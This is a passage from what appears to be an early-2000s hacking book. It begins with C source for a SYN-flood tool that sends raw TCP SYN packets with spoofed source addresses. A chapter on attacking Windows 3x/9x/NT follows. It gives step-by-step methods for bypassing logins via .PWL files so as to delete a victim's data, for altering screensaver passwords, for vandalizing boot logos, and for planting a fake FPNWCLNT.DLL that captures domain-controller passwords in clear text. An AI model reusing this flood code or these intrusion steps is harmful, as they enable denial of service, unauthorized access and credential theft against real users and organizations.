
```c
        printf("Being Synful to %s at port %u from %s port %u\n", argv[1],
        port, tmpsrchost, random_port);
        srchost = host2ip(tmpsrchost);
        dosynpacket(srchost, dsthost, port, random_port);
    }
}
void dosynpacket(unsigned int source_addr, unsigned int dest_addr,
    unsigned short short_dest_port, unsigned short ran_port) {
    struct send_tcp
    {
        struct iphdr ip;
        struct tcphdr tcp;
    } send_tcp;
    struct pseudo_header
    {
        unsigned int source_address;
        unsigned int dest_address;
        unsigned char placeholder;
        unsigned char protocol;
        unsigned short tcp_length;
        struct tcphdr tcp;
    } pseudo_header;
    int tcp_socket;
    struct sockaddr_in sin;
    int sinlen;
    send_tcp.ip.ihl = 5;
    send_tcp.ip.version = 4;
    send_tcp.ip.tos = 0;
    send_tcp.ip.tot_len = htons(40);
    send_tcp.ip.id = ran_port;
    send_tcp.ip.frag_off = 0;
    send_tcp.ip.ttl = 255;
    send_tcp.ip.protocol = IPPROTO_TCP;
    send_tcp.ip.check = 0;
    send_tcp.ip.saddr = source_addr;
    send_tcp.ip.daddr = dest_addr;
    send_tcp.tcp.source = ran_port;
    send_tcp.tcp.dest = htons(dest_port);
    send_tcp.tcp.seq = ran_port;
    send_tcp.tcp.ack_seq = 0;
    send_tcp.tcp.res1 = 0;
    send_tcp.tcp.doff = 5;
    send_tcp.tcp.fin = 0;
    send_tcp.tcp.syn = 1;
    send_tcp.tcp.rst = 0;
    send_tcp.tcp.psh = 0;
    send_tcp.tcp.ack = 0;
    send_tcp.tcp.urg = 0;
    send_tcp.tcp.res2 = 0;
    send_tcp.tcp.window = htons(512);
    send_tcp.tcp.check = 0;
    send_tcp.tcp.urg_ptr = 0;
    sin.sin_family = AF_INET;
    sin.sin_port = send_tcp.tcp.source;
    sin.sin_addr.s_addr = send_tcp.ip.daddr;
    tcp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(tcp_socket < 0)
    {
        perror("socket");
        exit(1);
    }
    send_tcp.tcp.source++; send_tcp.ip.id++; send_tcp.tcp.seq++;
    send_tcp.tcp.check = 0; send_tcp.ip.check = 0;
    send_tcp.ip.check = in_cksum((unsigned short *) &send_tcp.ip, 20);
    pseudo_header.source_address = send_tcp.ip.saddr;
    pseudo_header.dest_address = send_tcp.ip.daddr;
    pseudo_header.placeholder = 0;
    pseudo_header.protocol = IPPROTO_TCP;
    pseudo_header.tcp_length = htons(20);
    bcopy((char *) &send_tcp.tcp, (char *) &pseudo_header.tcp, 20);
    send_tcp.tcp.check = in_cksum((unsigned short *) &pseudo_header, 32);
    sinlen = sizeof(sin);
    sendto(tcp_socket, &send_tcp, 40, 0, (struct sockaddr *) &sin, sinlen);
    close(tcp_socket);
}

unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
    register long    sum;      /* assumes long == 32 bits */
    u_short      oddbyte;
    register u_shortanswer;        /* assumes u_short == 16 bits */
    sum = 0;
    while (nbytes > 1)  {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;      /* make sure top half is zero */
        *((u_char *) &oddbyte) = *((u_char *)ptr);  /* one byte only */
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);  /* add high-16 to low-16 */
    sum += (sum >> 16);     /* add carry */
    answer = ~sum;    /* ones-complement, then truncate to 16 bits */
    return(answer);
}

unsigned int host2ip(char *hostname)
{
    static struct in_addr i;
    struct hostent  *h;
    i.s_addr = inet_addr(hostname);
    if(i.s_addr == -1)
    {
        h = gethostbyname (hostname);
        if (h == NULL)
        {
            fprintf (stderr, "cant find %s!\n", hostname);
            exit(0);
        }
        bcopy(h->h_addr,  (char *)&i.s_addr, h->h_length);
    }
    return i.s_addr;
}
void inirand(void)
{
    struct timeval tv;
    gettimeofday(&tv,  (struct timezone *) NULL);
    srand(tv.tv_usec);
}
```

## Microsoft Windows

Since 1975, Bill Gates, under the auspices of his company, Microsoft (www.microsoft.com), has overseen the development of the leading Windows operating systems and software, predominantly for the PC. Following exponential expansion, these products are now found in homes, schools, and businesses worldwide. As of December 31, 1999, Microsoft was employing 34,571 people globally, of whom 14,433 were engaged in research and development.

But Windows developers have been focusing on designing more features and system control, with less attention being paid to security concerns. The result is that the majority of Underground hackers specifically target Windows vulnerabilities. Therefore, this section is devoted to hacker attacks on Windows systems, including versions 3x, 9x, 9x Millennium, NT, and 2000.

![](img/ba85bb40c695c02adae8cbd6666f2e0c_576_0.png)

> Although many of the hacking techniques and programs reviewed in Chapter 8 can be applied to the Windows operating system, in this chapter, we'll explore specialized techniques, from gaining access and control to instigating widespread mayhem.

- Liabilities
- Password Cracking
- Cracking System Login Passwords

**Synopsis:** Locating and manipulating the password file can facilitate illicit login access.

**Hack State:** Unauthorized access.

![](img/ba85bb40c695c02adae8cbd6666f2e0c_577_0.png)

**Figure 10.5** Searching for the .PWL files.

**Vulnerabilities:** Win 3x, 9x.

**Breach:** One of the most common hacking techniques involves maneuvering the login data file, `???PWL`, usually in the Windows directory (see Figure 10.5). The three question marks represent the actual login username for a specific profile that has system access and is associated with a unique profile.

This particular breach is typical in corporate environments whereby causing havoc is intended. On systems with multiple profiles, the attacker simply moves the target file to a temporary directory, then logs in with the victim’s username, minus the password. At this point, data are deleted, desktop settings are modified, and so on. When the damage is complete, the attacker restores the USERNAME.PWL file and logs out. The attacker may also copy the file to a diskette and crack the password with any number of the password-cracking utilities described in Chapter 8. As a result, the system can become accessible to remote control Trojan implementation, including networking domination. An alternative attack on single-profile systems is when the attacker bypasses the login screen password prompt by pressing F8, then selecting to enter MS-DOS (#7) at bootup.

### Cracking Screensaver Passwords

**Synopsis:** Locating and manipulating screensaver password information can facilitate illicit login access.

**Hack State:** Unauthorized access.

**Vulnerabilities:** Win 3x, 9x.

**Breach:** By modifying the data coupled with the ScreenSaver\_Data string, hackers can change screensaver passwords to gain unauthorized access to a system. The target files associated with this crack attack are: Control.INI for Win 3x and user.dat for Win 9x (located in the /Windows directory). The data that follows the password string represents the hex digits of the unencrypted ASCII values. (To brush up on hex conversions, review Chapter 6, “The Hacker’s Technology Handbook.”)

Hackers employed in corporate America like to take this exploit a bit further by embarrassing friends and coworkers with what’s called a logo revamp. As all Windows users know, each time Windows boots up and shuts down, the Microsoft logo is displayed while programs and drivers are loaded and unloaded in the background. Also well known to users is how to change the system wallpaper. This particular attack involves customizing the actual system logos; it requires following a series of very simple steps:

1. After bypassing the screensaver password or cracking the system login, the attacker quickly scans for and executes any graphical illustration package, such as Adobe Photoshop or Paint.
2. From the illustration program, the attacker opens Files of Type: All Files and looks in the root \Windows directory for any `logo*.sys` files. This is where the Microsoft graphical logos that appear during startup/shutdown are stored.
3. At this point the attacker simply modifies the `Logow.sys` file, either to include some nasty phrase or graphic, and then saves the file as the new custom shutdown logo. To demonstrate the system shutdown logo has been selected in Figure 10.6.

### Sniffing Password Files

**Synopsis:** Transferring a bogus .DLL can deceptively capture passwords in clear text.

**Hack State:** Password capture.

**Vulnerabilities:** Win NT

**Breach:** Hackers replace a dynamic link library (DLL) file in the system32 directory with a penetrator that captures passwords from a domain controller in clear text. `FPNWCLNT`, which typically operates in a NetWare environment and is associated with Registry to `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa`, can be manipulated to communicate passwords with an imitation `FPNWCLNT.DLL` (see Figure 10.7).

After compiling the following penetrator (FPNWCLNT.C), the attacker simply renames the file with a .DLL extension and transfers the file to the root //system32 directory on the primary domain controller. The code can be modified.

![](img/ba85bb40c695c02adae8cbd6666f2e0c_578_0.png)

**Figure 10.6** The Win 9x shutdown logo.
